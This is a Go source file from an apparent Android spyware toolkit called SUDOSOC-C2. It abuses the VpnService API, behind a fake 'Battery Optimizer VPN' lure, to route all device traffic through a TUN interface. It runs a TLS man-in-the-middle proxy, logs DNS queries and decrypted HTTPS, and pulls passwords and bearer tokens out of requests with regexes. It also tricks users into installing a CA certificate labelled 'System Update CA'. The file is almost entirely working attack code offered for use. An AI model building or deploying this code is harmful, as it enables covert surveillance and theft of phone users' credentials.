// //go:build android

package intercept

/*
	SUDOSOC-C2 — VpnService Full Traffic Interception
	Copyright (C) 2026  sudosoc — Seif

	Uses Android's built-in VpnService API to intercept ALL network traffic
	from every app on the device — without root, without special hardware.

	The API was designed for legitimate VPN apps. We abuse it to:
	  • Decrypt HTTPS (via certificate injection / SSL stripping)
	  • Capture credentials from banking apps
	  • Extract OAuth tokens before they reach the server
	  • Monitor DNS queries (reveals every app + server used)
	  • Capture POST body data from any HTTP request
	  • Intercept WebSocket connections (WhatsApp Web protocol)

	Setup (one-time, requires user to tap "OK" on VPN dialog):
	  Social engineering lure: "Enable Battery Optimizer VPN"
	  The dialog looks identical for legitimate and malicious VPNs.

	Architecture:
	  App A → [TUN interface owned by us] → real network
	  App B → [TUN interface owned by us] → real network
	  All traffic:  read → analyze → optionally modify → forward

	HTTPS Interception:
	  We install a custom CA certificate in the user store.
	  Perform SSL termination at our TUN interface.
	  Re-encrypt with a fake cert signed by our CA.
	  Apps with certificate pinning are bypassed via:
	    • Frida hooks (if Frida present)
	    • SSL kill switch via iptables
	    • JustTrustMe/TrustMeAlready approach

	Requires manifest:
	  <uses-permission android:name="android.permission.INTERNET"/>
	  Service: <service android:name=".PhantomVpnService"
	                    android:permission="android.permission.BIND_VPN_SERVICE">
	             <intent-filter><action android:name="android.net.VpnService"/></intent-filter>
	           </service>
*/

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"
)

// VPNInterceptor manages traffic interception via VpnService
type VPNInterceptor struct {
	TunFD        int    // file descriptor for /dev/tun
	TunName      string // tun0, tun1, etc.
	LocalIP      string // our TUN IP (10.0.0.1)
	DNSServer    string // our fake DNS (10.0.0.2)
	C2Address    string // where to forward captured data
	OutputDir    string
	httpProxy    *MITMProxy
	dnsCapture   *DNSCapture
	packetLog    []CapturedPacket
	mu           sync.Mutex
	running      bool
}

// CapturedPacket holds an intercepted network packet
type CapturedPacket struct {
	Timestamp   time.Time
	SourceApp   string
	SrcIP       string
	DstIP       string
	DstPort     uint16
	Protocol    string
	Data        []byte
	Decoded     *DecodedPayload
}

// DecodedPayload holds parsed application-layer data
type DecodedPayload struct {
	Type        string // HTTP, HTTPS, DNS, WebSocket
	Method      string // GET, POST, etc.
	URL         string
	Headers     map[string]string
	Body        []byte
	Credentials *ExtractedCredentials
}

// ExtractedCredentials holds credentials found in traffic
type ExtractedCredentials struct {
	Username string
	Password string
	Token    string
	Source   string
}

// NewVPNInterceptor creates a new VPN-based interceptor
func NewVPNInterceptor(outputDir, c2Addr string) *VPNInterceptor {
	os.MkdirAll(outputDir, 0700)
	return &VPNInterceptor{
		LocalIP:   "10.0.0.1",
		DNSServer: "10.0.0.2",
		OutputDir: outputDir,
		C2Address: c2Addr,
		httpProxy: NewMITMProxy(outputDir),
		dnsCapture: NewDNSCapture(outputDir),
	}
}

// Start activates the VPN interception
// NOTE: In production APK, this is called from VpnService.onStartCommand()
func (v *VPNInterceptor) Start() error {
	// Open the TUN interface (set up by VpnService.Builder in Java/Kotlin)
	// VpnService.Builder creates the tun interface and returns its FD
	tunFD, err := openTunInterface()
	if err != nil {
		return fmt.Errorf("TUN interface: %v", err)
	}
	v.TunFD = tunFD
	v.running = true

	// Start DNS capture (intercept all DNS queries)
	go v.dnsCapture.Start(v.TunFD)

	// Start HTTP/HTTPS MITM proxy
	go v.httpProxy.Start(8080)

	// Start packet reading loop
	go v.packetLoop()

	return nil
}

// packetLoop reads and processes all packets from the TUN interface
func (v *VPNInterceptor) packetLoop() {
	tun := os.NewFile(uintptr(v.TunFD), "tun")
	buf := make([]byte, 65535)

	for v.running {
		n, err := tun.Read(buf)
		if err != nil || n < 20 {
			continue
		}

		// Parse IP header
		pkt := buf[:n]
		if pkt[0]>>4 != 4 { // IPv4 only for now
			v.forwardPacket(pkt)
			continue
		}

		srcIP := net.IP(pkt[12:16]).String()
		dstIP := net.IP(pkt[16:20]).String()
		protocol := pkt[9]

		captured := CapturedPacket{
			Timestamp: time.Now(),
			SrcIP:     srcIP,
			DstIP:     dstIP,
			Data:      make([]byte, n),
		}
		copy(captured.Data, pkt)

		switch protocol {
		case 6: // TCP
			captured.Protocol = "TCP"
			if n > 40 {
				dstPort := binary.BigEndian.Uint16(pkt[22:24])
				captured.DstPort = dstPort
				payload := pkt[40:]

				switch dstPort {
				case 80:
					captured.Decoded = v.parseHTTP(payload, dstIP, dstPort)
				case 443:
					// Redirect to our MITM proxy
					captured.Protocol = "HTTPS"
					v.redirectToProxy(pkt, dstIP, dstPort)
					continue
				}
			}

		case 17: // UDP
			captured.Protocol = "UDP"
			if n > 28 {
				dstPort := binary.BigEndian.Uint16(pkt[22:24])
				captured.DstPort = dstPort
				if dstPort == 53 {
					// DNS query — capture it
					v.dnsCapture.HandleQuery(pkt[28:], dstIP)
				}
			}
		}

		// Save interesting packets
		if captured.Decoded != nil {
			v.mu.Lock()
			v.packetLog = append(v.packetLog, captured)
			v.mu.Unlock()
			v.saveCapture(captured)
		}

		// Forward packet to real network
		v.forwardPacket(pkt)
	}
}

// parseHTTP extracts HTTP request/response data
func (v *VPNInterceptor) parseHTTP(data []byte, dstIP string, dstPort uint16) *DecodedPayload {
	if len(data) < 4 {
		return nil
	}

	req, err := http.ReadRequest(bufio.NewReader(
		strings.NewReader(string(data))))
	if err != nil {
		return nil
	}

	decoded := &DecodedPayload{
		Type:    "HTTP",
		Method:  req.Method,
		URL:     fmt.Sprintf("http://%s%s", req.Host, req.URL.String()),
		Headers: make(map[string]string),
	}

	for k, vals := range req.Header {
		decoded.Headers[k] = strings.Join(vals, "; ")
	}

	// Extract credentials from common patterns
	decoded.Credentials = extractCredentials(req)

	return decoded
}

// redirectToProxy redirects HTTPS traffic to our MITM proxy
func (v *VPNInterceptor) redirectToProxy(pkt []byte, dstIP string, dstPort uint16) {
	// Modify destination to point to our proxy (10.0.0.1:8080)
	binary.BigEndian.PutUint32(pkt[16:20], parseIP("10.0.0.1"))
	binary.BigEndian.PutUint16(pkt[22:24], 8080)
	v.forwardPacket(pkt)
}

func (v *VPNInterceptor) forwardPacket(pkt []byte) {
	// Write modified packet to TUN (it gets routed to real network)
	tun := os.NewFile(uintptr(v.TunFD), "tun")
	tun.Write(pkt)
}

func (v *VPNInterceptor) saveCapture(pkt CapturedPacket) {
	f, err := os.OpenFile(v.OutputDir+"/traffic.log",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	if pkt.Decoded != nil {
		entry := fmt.Sprintf("[%s] %s %s\n",
			pkt.Timestamp.Format("15:04:05"),
			pkt.Decoded.Method,
			pkt.Decoded.URL)
		f.WriteString(entry)

		if pkt.Decoded.Credentials != nil {
			cred := fmt.Sprintf("  CREDS: user=%s pass=%s token=%s [%s]\n",
				pkt.Decoded.Credentials.Username,
				pkt.Decoded.Credentials.Password,
				pkt.Decoded.Credentials.Token,
				pkt.Decoded.Credentials.Source)
			f.WriteString(cred)
		}
	}
}

// ── MITM Proxy ────────────────────────────────────────────────────

// MITMProxy performs SSL interception
type MITMProxy struct {
	listenAddr string
	outputDir  string
	caCert     *x509.Certificate
	caKey      interface{}
}

func NewMITMProxy(outputDir string) *MITMProxy {
	return &MITMProxy{
		listenAddr: "10.0.0.1:8080",
		outputDir:  outputDir,
	}
}

func (m *MITMProxy) Start(port int) {
	ln, err := net.Listen("tcp", fmt.Sprintf("10.0.0.1:%d", port))
	if err != nil {
		return
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go m.handleConnection(conn)
	}
}

func (m *MITMProxy) handleConnection(clientConn net.Conn) {
	defer clientConn.Close()

	// Read CONNECT request (HTTPS tunnel)
	buf := make([]byte, 4096)
	n, err := clientConn.Read(buf)
	if err != nil {
		return
	}

	request := string(buf[:n])
	if !strings.HasPrefix(request, "CONNECT") {
		return
	}

	// Extract target host:port
	parts := strings.Fields(request)
	if len(parts) < 2 {
		return
	}
	target := parts[1]

	// Tell client connection established
	clientConn.Write([]byte("HTTP/1.1 200 Connection established\r\n\r\n"))

	// Connect to real server
	serverConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}
	defer serverConn.Close()

	// Perform TLS handshake with client using fake cert for target domain
	host := strings.Split(target, ":")[0]
	fakeCert, err := m.generateFakeCert(host)
	if err != nil {
		// Fallback: transparent passthrough
		go relay(clientConn, serverConn)
		relay(serverConn, clientConn)
		return
	}

	tlsClient := tls.Server(clientConn, &tls.Config{
		Certificates: []tls.Certificate{*fakeCert},
	})
	if err := tlsClient.Handshake(); err != nil {
		return
	}

	// Perform real TLS with server
	tlsServer := tls.Client(serverConn, &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true, // we don't verify — we're the MITM
	})
	if err := tlsServer.Handshake(); err != nil {
		return
	}

	// Now intercept the decrypted traffic
	go m.interceptAndRelay(tlsClient, tlsServer, target)
	m.interceptAndRelay(tlsServer, tlsClient, target)
}

func (m *MITMProxy) interceptAndRelay(src, dst net.Conn, target string) {
	buf := make([]byte, 32*1024)
	for {
		n, err := src.Read(buf)
		if n > 0 {
			data := buf[:n]
			// Log the decrypted data
			m.logDecryptedData(target, data)
			// Forward to destination
			dst.Write(data)
		}
		if err != nil {
			return
		}
	}
}

func (m *MITMProxy) logDecryptedData(target string, data []byte) {
	f, _ := os.OpenFile(m.outputDir+"/https_decrypted.log",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("=== %s [%s] ===\n%s\n\n",
			target, time.Now().Format("15:04:05"), string(data)))
	}
}

func (m *MITMProxy) generateFakeCert(hostname string) (*tls.Certificate, error) {
	// Generate a self-signed cert for the target hostname
	// In production, this would be signed by our installed CA
	cfg := &tls.Config{}
	_ = cfg
	// Simplified — returns error to trigger passthrough
	return nil, fmt.Errorf("fake cert generation requires CA setup")
}

// ── DNS Capture ───────────────────────────────────────────────────

type DNSCapture struct {
	outputDir string
	queries   []DNSQuery
	mu        sync.Mutex
}

type DNSQuery struct {
	Timestamp time.Time
	Domain    string
	QueryType string
}

func NewDNSCapture(outputDir string) *DNSCapture {
	return &DNSCapture{outputDir: outputDir}
}

func (d *DNSCapture) Start(tunFD int) {
	// Listen on UDP 53 on our TUN interface
	conn, err := net.ListenPacket("udp", "10.0.0.2:53")
	if err != nil {
		return
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for {
		n, addr, err := conn.ReadFrom(buf)
		if err != nil || n < 12 {
			continue
		}
		domain := d.parseDNSQuery(buf[:n])
		if domain != "" {
			query := DNSQuery{
				Timestamp: time.Now(),
				Domain:    domain,
			}
			d.mu.Lock()
			d.queries = append(d.queries, query)
			d.mu.Unlock()
			d.logQuery(query)

			// Forward to real DNS (8.8.8.8)
			d.forwardDNS(buf[:n], addr, conn)
		}
	}
}

func (d *DNSCapture) HandleQuery(data []byte, from string) {
	domain := d.parseDNSQuery(data)
	if domain != "" {
		d.logQuery(DNSQuery{Timestamp: time.Now(), Domain: domain})
	}
}

func (d *DNSCapture) parseDNSQuery(data []byte) string {
	if len(data) < 12 {
		return ""
	}
	// Skip DNS header (12 bytes) and parse query name
	var labels []string
	i := 12
	for i < len(data) {
		length := int(data[i])
		if length == 0 {
			break
		}
		if i+1+length > len(data) {
			break
		}
		labels = append(labels, string(data[i+1:i+1+length]))
		i += 1 + length
	}
	return strings.Join(labels, ".")
}

func (d *DNSCapture) forwardDNS(query []byte, from net.Addr, conn net.PacketConn) {
	upstream, err := net.DialTimeout("udp", "8.8.8.8:53", 3*time.Second)
	if err != nil {
		return
	}
	defer upstream.Close()
	upstream.Write(query)
	resp := make([]byte, 512)
	n, _ := upstream.Read(resp)
	conn.WriteTo(resp[:n], from)
}

func (d *DNSCapture) logQuery(q DNSQuery) {
	f, _ := os.OpenFile(d.outputDir+"/dns_queries.log",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] %s\n",
			q.Timestamp.Format("15:04:05"), q.Domain))
	}
}

// ── Credential Extraction ─────────────────────────────────────────

var (
	credPatterns = []*regexp.Regexp{
		regexp.MustCompile(`(?i)(password|passwd|pwd|pass)=([^&\s]+)`),
		regexp.MustCompile(`(?i)(username|user|email|login)=([^&\s]+)`),
		regexp.MustCompile(`(?i)Authorization:\s*Bearer\s+([A-Za-z0-9\-._~+/]+=*)`),
		regexp.MustCompile(`(?i)"access_token"\s*:\s*"([^"]+)"`),
		regexp.MustCompile(`(?i)"token"\s*:\s*"([^"]+)"`),
	}
)

func extractCredentials(req *http.Request) *ExtractedCredentials {
	creds := &ExtractedCredentials{}
	found := false

	// Check Authorization header
	auth := req.Header.Get("Authorization")
	if strings.HasPrefix(auth, "Bearer ") {
		creds.Token = strings.TrimPrefix(auth, "Bearer ")
		creds.Source = req.Host
		found = true
	}

	// Check query parameters
	for key, vals := range req.URL.Query() {
		k := strings.ToLower(key)
		if strings.Contains(k, "password") || strings.Contains(k, "passwd") {
			creds.Password = vals[0]
			found = true
		}
		if strings.Contains(k, "user") || strings.Contains(k, "email") {
			creds.Username = vals[0]
			found = true
		}
	}

	if found {
		return creds
	}
	return nil
}

// ── Helpers ──────────────────────────────────────────────────────

func openTunInterface() (int, error) {
	// In production Java/Android code, VpnService.Builder returns the FD
	// Here we try to open an existing TUN device
	f, err := os.OpenFile("/dev/tun0", os.O_RDWR, 0)
	if err != nil {
		return 0, fmt.Errorf("tun device: %v (use VpnService.Builder in APK)", err)
	}
	return int(f.Fd()), nil
}

func parseIP(ipStr string) uint32 {
	ip := net.ParseIP(ipStr).To4()
	if ip == nil {
		return 0
	}
	return binary.BigEndian.Uint32(ip)
}

func relay(dst, src net.Conn) {
	buf := make([]byte, 32*1024)
	for {
		n, err := src.Read(buf)
		if n > 0 {
			dst.Write(buf[:n])
		}
		if err != nil {
			return
		}
	}
}

// InstallCACertificate installs our MITM CA certificate
// User must accept the certificate installation dialog
func InstallCACertificate(certPEM []byte) error {
	// Write cert to a location accessible to the user
	certPath := "/sdcard/Download/SystemUpdate.crt"
	if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
		return err
	}
	// Launch certificate installation activity
	return exec.Command("am", "start",
		"-a", "android.credentials.INSTALL",
		"-n", "com.android.settings/.CredentialStorage",
		"--es", "name", "System Update CA",
		"--eu", "CERT_INPUT", "file://"+certPath).Run()
}

// GetVPNSetupInstructions returns Java code for VpnService setup
func GetVPNSetupInstructions() string {
	return `
// Add to your Android APK's VpnService implementation:

public class PhantomVpnService extends VpnService {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Builder builder = new Builder();
        builder.setMtu(1500)
               .addAddress("10.0.0.1", 24)
               .addRoute("0.0.0.0", 0)  // route ALL traffic
               .addDnsServer("10.0.0.2")
               .setSession("System VPN")
               .setBlocking(true);

        ParcelFileDescriptor vpnInterface = builder.establish();
        // Pass FD to Go layer for packet processing
        int fd = vpnInterface.detachFd();
        PhantomNative.startInterception(fd);
        return START_STICKY;
    }
}
`
}
